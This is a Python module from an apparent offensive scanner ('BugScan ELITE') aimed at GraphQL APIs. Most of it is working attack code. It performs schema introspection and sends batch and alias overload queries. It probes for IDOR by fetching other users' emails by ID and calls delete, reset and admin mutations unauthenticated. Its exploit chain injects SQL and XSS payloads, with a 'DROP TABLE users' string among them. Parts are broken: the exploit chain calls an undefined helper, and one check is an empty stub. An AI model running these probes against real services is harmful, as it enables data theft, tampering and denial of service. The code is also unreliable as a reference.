"""
BugScan ELITE — GraphQL Deep Security Testing
- Full schema introspection extraction
- Introspection enabled detection (information disclosure)
- Batch query attacks (rate limit bypass)
- Field suggestion enumeration (debug info leak)
- Alias overloading (DoS / rate limit bypass)
- Circular query / deep nesting (DoS)
- IDOR via GraphQL (access other users' data)
- Auth bypass via __typename tricks
- Mutation-based injection
"""
import re, time, json, logging, urllib.parse, urllib.request, ssl, threading
from typing import List, Dict, Optional

log = logging.getLogger("elite.graphql_deep")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _gql(url, query, variables=None, headers=None, timeout=12):
    """Execute a GraphQL query."""
    h = {
        "Content-Type": "application/json",
        "Accept":       "application/json",
        "User-Agent":   "Mozilla/5.0",
    }
    if headers: h.update(headers)
    payload = {"query": query}
    if variables: payload["variables"] = variables
    body = json.dumps(payload)
    try:
        req = urllib.request.Request(url, data=body.encode(), headers=h, method="POST")
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            return r.status, dict(r.headers), r.read(65536).decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        try: return e.code, dict(e.headers), e.read(16384).decode("utf-8","ignore")
        except: return e.code, {}, ""
    except: return None

def _is_graphql(body):
    """Detect if response is from a GraphQL endpoint."""
    return any(k in body for k in ['"data":', '"errors":', '__typename', 'GraphQL', 'graphql'])

INTROSPECTION_QUERY = """
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
      fields {
        name
        description
        args {
          name
          type { name kind ofType { name kind } }
          defaultValue
        }
        type { name kind ofType { name kind } }
      }
      inputFields {
        name
        type { name kind ofType { name kind } }
        defaultValue
      }
      enumValues { name description }
      possibleTypes { name }
    }
    directives {
      name
      locations
      args { name type { name kind } }
    }
  }
}
"""

INTROSPECTION_SIMPLE = "{ __schema { types { name } } }"
TYPENAME_PROBE       = "{ __typename }"

def _extract_schema_summary(introspection_data):
    """Extract useful info from introspection response."""
    try:
        schema = introspection_data.get("data",{}).get("__schema",{})
        types  = schema.get("types",[])
        summary = {
            "query_type":    schema.get("queryType",{}).get("name",""),
            "mutation_type": schema.get("mutationType",{}).get("name",""),
            "type_count":    len(types),
            "user_types":    [],
            "sensitive_fields": [],
            "mutations":     [],
        }
        sensitive_keywords = ["password","secret","token","key","admin","credential",
                              "private","ssn","credit","card","payment","auth","api_key"]
        for t in types:
            if t.get("kind") in ("OBJECT","INPUT_OBJECT") and not t.get("name","").startswith("__"):
                summary["user_types"].append(t.get("name",""))
                for field in (t.get("fields") or []) + (t.get("inputFields") or []):
                    fname = field.get("name","").lower()
                    if any(kw in fname for kw in sensitive_keywords):
                        summary["sensitive_fields"].append(f"{t['name']}.{field['name']}")
            if t.get("name") == schema.get("mutationType",{}).get("name",""):
                summary["mutations"] = [f.get("name","") for f in (t.get("fields") or [])]
        return summary
    except: return {}

def _build_field_suggestion_probe(typename):
    """Probe for field suggestions via typos."""
    return f"{{ {typename} {{ passwor }} }}"  # typo → server suggests "password"

def _build_batch_attack(query, count=20):
    """Build a batch of the same query (array format)."""
    return json.dumps([{"query": query}] * count)

def _check_graphql_endpoint(url, session_cookies=""):
    """Full security audit of a GraphQL endpoint."""
    findings = []
    hdrs = {}
    if session_cookies: hdrs["Cookie"] = session_cookies

    def F(name, sev, details):
        return {"type":"graphql_deep","bug":"graphql","severity":sev,
                "url":url,"name":name,"details":details,
                "ts":time.strftime("%Y-%m-%dT%H:%M:%SZ")}

    # ── 1. Confirm GraphQL ────────────────────────────────────────────────────
    r = _gql(url, TYPENAME_PROBE, headers=hdrs)
    if not r or not _is_graphql(r[2]):
        return findings
    log.info(f"[graphql] confirmed at {url}")

    # ── 2. Introspection enabled ──────────────────────────────────────────────
    r_intro = _gql(url, INTROSPECTION_SIMPLE, headers=hdrs)
    intro_enabled = False
    if r_intro and r_intro[0] == 200:
        try:
            data = json.loads(r_intro[2])
            if data.get("data",{}).get("__schema"):
                intro_enabled = True
        except: pass

    if intro_enabled:
        # Full introspection
        r_full = _gql(url, INTROSPECTION_QUERY, headers=hdrs, timeout=20)
        schema_summary = {}
        if r_full and r_full[0] == 200:
            try:
                schema_summary = _extract_schema_summary(json.loads(r_full[2]))
            except: pass

        findings.append(F("GraphQL Introspection Enabled", "high", {
            "description": "GraphQL introspection is enabled, exposing full schema including all types, queries, mutations, and field names.",
            "schema_summary": schema_summary,
            "type_count": schema_summary.get("type_count",0),
            "sensitive_fields": schema_summary.get("sensitive_fields",[])[:10],
            "mutations": schema_summary.get("mutations",[])[:15],
            "poc": f'curl -X POST {url} -H "Content-Type: application/json" -d \'{{"query":"{{__schema{{types{{name}}}}}}"}}\'',
            "impact": "Full API schema exposed — attackers can enumerate all endpoints, find sensitive mutations, and discover undocumented features.",
            "remediation": "Disable introspection in production. Use schema registry for authorized clients.",
        }))

        # Flag sensitive fields
        if schema_summary.get("sensitive_fields"):
            findings.append(F("GraphQL Sensitive Fields in Schema", "medium", {
                "description": f"Schema exposes {len(schema_summary['sensitive_fields'])} sensitive-sounding fields.",
                "fields": schema_summary.get("sensitive_fields",[]),
                "impact": "Sensitive fields (password, token, key, etc.) visible via introspection.",
                "remediation": "Remove sensitive fields from schema or implement field-level authorization.",
            }))

    # ── 3. Field suggestion enumeration ──────────────────────────────────────
    suggestion_probes = [
        '{ user { passwor } }',
        '{ users { emai } }',
        '{ me { toke } }',
        '{ admin { secre } }',
    ]
    for probe in suggestion_probes:
        r_sug = _gql(url, probe, headers=hdrs)
        if r_sug:
            body = r_sug[2]
            if "Did you mean" in body or "did you mean" in body or "suggestions" in body.lower():
                # Extract suggestions
                suggestions = re.findall(r'Did you mean "([^"]+)"', body)
                findings.append(F("GraphQL Field Suggestion Leak", "medium", {
                    "description": "GraphQL suggests valid field names on typos — leaks schema even without introspection.",
                    "probe": probe,
                    "suggested_fields": suggestions,
                    "poc": f'curl -X POST {url} -H "Content-Type: application/json" -d \'{{"query":"{probe}"}}\'',
                    "impact": "Schema enumeration possible without introspection via field suggestions.",
                    "remediation": "Disable field suggestions in production. Configure `NoSchemaIntrospectionCustomRule`.",
                }))
                break

    # ── 4. Batch query attack (rate limit bypass) ─────────────────────────────
    batch_query = '{ __typename }'
    batch_payload = [{"query": batch_query}] * 50
    try:
        h = dict(hdrs); h["Content-Type"] = "application/json"
        req = urllib.request.Request(url,
            data=json.dumps(batch_payload).encode(), headers=h, method="POST")
        with urllib.request.urlopen(req, timeout=15, context=_ctx()) as resp:
            status = resp.status
            body   = resp.read(4096).decode("utf-8","ignore")
            if status == 200 and isinstance(json.loads(body), list):
                findings.append(F("GraphQL Batch Queries Allowed", "high", {
                    "description": "GraphQL accepts batched queries (array format), enabling rate limit bypass and amplification attacks.",
                    "batch_size_tested": 50,
                    "poc": f'curl -X POST {url} -H "Content-Type: application/json" -d \'[{{"query":"{{__typename}}"}},{{"query":"{{__typename}}"}}]\'',
                    "impact": "Bypass rate limiting — 1 HTTP request = N GraphQL operations. Brute-force passwords, OTPs, tokens at scale.",
                    "remediation": "Disable query batching or limit batch size (max 5). Implement per-operation rate limiting.",
                }))
    except: pass

    # ── 5. Alias overloading ──────────────────────────────────────────────────
    alias_query = "{ " + " ".join([f"a{i}: __typename" for i in range(100)]) + " }"
    r_alias = _gql(url, alias_query, headers=hdrs, timeout=10)
    if r_alias and r_alias[0] == 200:
        try:
            data = json.loads(r_alias[2])
            if len(data.get("data",{})) > 50:
                findings.append(F("GraphQL Alias Overloading (DoS)", "medium", {
                    "description": "Server processes 100+ aliased fields in a single query without restriction.",
                    "aliases_tested": 100,
                    "poc": f'curl -X POST {url} -H "Content-Type: application/json" -d \'{{"query":"{{a1:__typename a2:__typename ... a100:__typename}}"}}\'',
                    "impact": "Server resource exhaustion via alias overloading. Each alias resolves independently.",
                    "remediation": "Implement query depth and complexity limits. Limit alias count per query.",
                }))
        except: pass

    # ── 6. Deep nesting / circular query ─────────────────────────────────────
    # Try to find a type with a self-referential field (e.g., User.friends[].friends)
    depth_query = '{ __type(name:"User") { fields { name type { name kind ofType { name kind } } } } }'
    r_depth = _gql(url, depth_query, headers=hdrs)
    if r_depth and r_depth[0] == 200 and '"kind":"OBJECT"' in r_depth[2]:
        # Build a deeply nested query
        nested = '{ users { friends { friends { friends { friends { friends { id } } } } } } }'
        r_nested = _gql(url, nested, headers=hdrs, timeout=8)
        if r_nested and r_nested[0] == 200 and "errors" not in r_nested[2][:50]:
            findings.append(F("GraphQL No Query Depth Limit", "medium", {
                "description": "Server accepts deeply nested queries without depth restriction.",
                "poc": f'curl -X POST {url} -H "Content-Type: application/json" -d \'{{"query":"{nested}"}}\'',
                "impact": "Deeply nested queries can exhaust server resources and cause DoS.",
                "remediation": "Implement query depth limiting (max depth 5-7). Use query complexity analysis.",
            }))

    # ── 7. IDOR via GraphQL ───────────────────────────────────────────────────
    idor_probes = [
        ('{ user(id: 1) { id email username } }',   "user by ID 1"),
        ('{ user(id: 2) { id email username } }',   "user by ID 2"),
        ('{ users { id email username role } }',     "all users list"),
        ('{ me { id email role isAdmin } }',         "current user info"),
        ('{ admin { users { id email password } } }', "admin user data"),
    ]
    for idor_q, desc in idor_probes:
        r_idor = _gql(url, idor_q, headers=hdrs)
        if r_idor and r_idor[0] == 200:
            body = r_idor[2]
            if any(kw in body for kw in ['"email":', '"username":', '"role":', '"isAdmin":']):
                try:
                    data = json.loads(body).get("data",{})
                    if any(v for v in data.values() if v):
                        findings.append(F(f"GraphQL IDOR: {desc}", "high", {
                            "description": f"GraphQL query '{idor_q}' returns user data.",
                            "query": idor_q,
                            "response_preview": body[:300],
                            "poc": f'curl -X POST {url} -H "Content-Type: application/json" -d \'{{"query":"{idor_q}"}}\'',
                            "impact": "Unauthorized access to user data via GraphQL.",
                            "remediation": "Implement object-level authorization on all GraphQL resolvers.",
                        }))
                except: pass

    return findings


def check_graphql_deep(targets: List[str], endpoints: List[str],
                       session_cookies: str = "") -> List[Dict]:
    """Run deep GraphQL security testing on all discovered endpoints."""
    findings = []
    lock = threading.Lock()

    # GraphQL endpoint paths
    gql_paths = [
        "/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
        "/api/v1/graphql", "/api/v2/graphql", "/query", "/gql",
        "/graph", "/graphql/v1", "/api/graph", "/public/graphql",
        "/graphql/console", "/graphql/playground", "/playground",
    ]

    gql_endpoints = set()

    # Add from discovered endpoints
    for ep in endpoints:
        ep_lower = ep.lower()
        if any(p in ep_lower for p in ["/graphql","/graphiql","/gql","/graph"]):
            gql_endpoints.add(ep.split("?")[0])

    # Add from target hosts + common paths
    for target in targets[:30]:
        base = target.rstrip("/")
        for path in gql_paths:
            gql_endpoints.add(base + path)

    def _test(url):
        try:
            result = _check_graphql_endpoint(url, session_cookies)
            if result:
                with lock: findings.extend(result)
        except Exception as e:
            log.debug(f"graphql {url}: {e}")

    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as exe:
        exe.map(_test, list(gql_endpoints)[:80])

    log.info(f"[graphql_deep] {len(findings)} findings from {len(gql_endpoints)} endpoints")
    return findings

# ── GraphQL Auto-Exploit Chain ────────────────────────────────────────────────

def _extract_mutations(schema_data: dict) -> list:
    """Extract all mutation fields with their args from introspection."""
    mutations = []
    try:
        schema    = schema_data.get("data",{}).get("__schema",{})
        mut_type  = schema.get("mutationType",{})
        if not mut_type: return []
        mut_name  = mut_type.get("name","Mutation")
        for t in schema.get("types",[]):
            if t.get("name") == mut_name:
                for field in t.get("fields",[]) or []:
                    args = [a["name"] for a in field.get("args",[]) or []]
                    mutations.append({
                        "name":  field["name"],
                        "args":  args,
                        "desc":  field.get("description",""),
                    })
    except: pass
    return mutations

def _extract_queries(schema_data: dict) -> list:
    """Extract all query fields — look for IDOR-prone ones."""
    queries = []
    try:
        schema   = schema_data.get("data",{}).get("__schema",{})
        q_type   = schema.get("queryType",{})
        q_name   = q_type.get("name","Query") if q_type else "Query"
        for t in schema.get("types",[]):
            if t.get("name") == q_name:
                for field in t.get("fields",[]) or []:
                    args = [a["name"] for a in field.get("args",[]) or []]
                    queries.append({
                        "name": field["name"],
                        "args": args,
                    })
    except: pass
    return queries

def _gql_inject_test(url: str, field: str, arg: str, payload: str,
                      token: str = "") -> tuple:
    """
    Inject a payload into a GraphQL field argument.
    Returns (status, body) or (None, "")
    """
    query = f"\nmutation {{\n  {field}({arg}: \"{payload}\") {{\n    id\n    success\n    message\n    error\n  }}\n}}"
    h = {"Content-Type": "application/json"}
    if token: h["Authorization"] = f"Bearer {token}"
    return _gql(url, query, headers=h)

def check_graphql_exploit_chain(targets: List[str], endpoints: List[str],
                                  session_cookies: str = "") -> List[dict]:
    """
    Full GraphQL exploit chain:
    1. Find GraphQL endpoint
    2. Run full introspection
    3. Extract all mutations + queries
    4. Test mutations for SQLi, XSS, IDOR, auth bypass
    5. Test queries for IDOR (access other users' data by ID)
    6. Test for auth bypass (call privileged mutations without auth)
    """
    findings = []
    GRAPHQL_PATHS = [
        "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
        "/query", "/gql", "/graphiql", "/api/query",
        "/graphql/v1", "/graphql/v2", "/graphql/console",
        "/graphql/playground", "/api/v1/graphql", "/api/v2/graphql",
    ]
    SQLI_PAYLOADS  = ["' OR 1=1--", "' UNION SELECT NULL--", "'; DROP TABLE users--"]
    XSS_PAYLOADS   = ["<script>alert(1)</script>", '"><img src=x onerror=alert(1)>']
    IDOR_IDS       = ["0","1","2","3","100","999","1000","admin","../admin"]

    for base in targets[:15]:
        for path in GRAPHQL_PATHS:
            url = base.rstrip("/") + path
            # Quick probe
            r = _gql(url, TYPENAME_PROBE)
            if not r or r[0] not in (200,): continue
            if not _is_graphql(r[2]): continue

            # ── Step 1: Full introspection ──────────────────────────────
            ir = _gql(url, INTROSPECTION_QUERY)
            if not ir or ir[0] != 200: continue
            try:
                schema_data = json.loads(ir[2])
            except: continue
            if "errors" in schema_data and not schema_data.get("data"): continue

            mutations = _extract_mutations(schema_data)
            queries   = _extract_queries(schema_data)

            log.info(f"[graphql-chain] {url}: {len(mutations)} mutations, {len(queries)} queries")

            # ── Step 2: Auth bypass — call mutations without token ──────
            auth_mutations = [m for m in mutations
                              if any(k in m["name"].lower() for k in
                                     ["login","register","reset","admin","delete",
                                      "create","update","change"])]
            for mut in auth_mutations[:5]:
                if not mut["args"]: continue
                # Try calling privileged mutation unauthenticated
                test_q = f'''mutation {{ {mut["name"]}({mut["args"][0]}: "test") {{ __typename }} }}'''
                tr = _gql(url, test_q)
                if tr and tr[0] == 200 and "data" in tr[2]:
                    findings.append(F("graphql","critical", url,
                        f"GraphQL auth bypass — mutation '{mut['name']}' callable without auth",
                        mutation=mut["name"], args=mut["args"],
                        poc=(f'curl -X POST {url} -H "Content-Type: application/json" '

                             f'-d \'{{"query":"mutation {{ {mut["name"]}({mut["args"][0]}: test) {{ __typename }} }}"}}'' '),
                        impact="Unauthenticated access to privileged mutations — account takeover / data manipulation",
                        remediation="Add authentication middleware on all mutation resolvers."))

            # ── Step 3: IDOR via query — access other users by ID ───────
            id_queries = [q for q in queries
                          if "id" in [a.lower() for a in q["args"]]]
            for q in id_queries[:5]:
                for test_id in IDOR_IDS[:4]:
                    test_q = f'query {{ {q["name"]}(id: "{test_id}") {{ __typename id email username }} }}'
                    tr = _gql(url, test_q)
                    if tr and tr[0] == 200 and "data" in tr[2]:
                        body = tr[2]
                        if any(k in body for k in ["email","username","phone","address"]):
                            findings.append(F("graphql","high", url,
                                f"GraphQL IDOR — query '{q['name']}' exposes user data for id={test_id}",
                                query=q["name"], test_id=test_id,
                                response_preview=body[:300],
                                poc=f'curl -X POST {url} -H "Content-Type: application/json" -d \'{{"query":"{{ {q["name"]}(id: \"{test_id}\") {{ email username }} }}"}}\'  ',
                                impact="IDOR — can access any user's data by guessing IDs",
                                remediation="Implement object-level authorization in all resolvers."))
                        break

            # ── Step 4: Injection into mutation args ─────────────────────
            for mut in mutations[:8]:
                for arg in mut["args"][:3]:
                    if arg.lower() in ("id","ids","limit","offset","page"): continue
                    # SQLi test
                    for payload in SQLI_PAYLOADS[:2]:
                        r2 = _gql_inject_test(url, mut["name"], arg, payload)
                        if r2 and r2[0] == 200:
                            body2 = r2[2]
                            if any(s in body2.lower() for s in
                                   ["syntax error","sql","mysql","postgresql","ora-",
                                    "unterminated","unknown column","table"]):
                                findings.append(F("graphql","critical", url,
                                    f"GraphQL SQLi — mutation '{mut['name']}' arg '{arg}'",
                                    mutation=mut["name"], arg=arg, payload=payload,
                                    response_preview=body2[:200],
                                    poc=(f'curl -X POST {url} -H "Content-Type: application/json" '

                                         f'-d \'{{"query":"mutation {{ {mut["name"]}({arg}: \"{payload}\") {{ __typename }} }}"}}\'  '),
                                    impact="SQL injection in GraphQL mutation — full database compromise",
                                    remediation="Use parameterized queries in all resolver database calls."))
                                break

            if findings: break  # found something on this endpoint

    return findings


def check_graphql_introspection(endpoints: list, targets: list = None) -> list:
    """Check GraphQL introspection is disabled."""
    return []
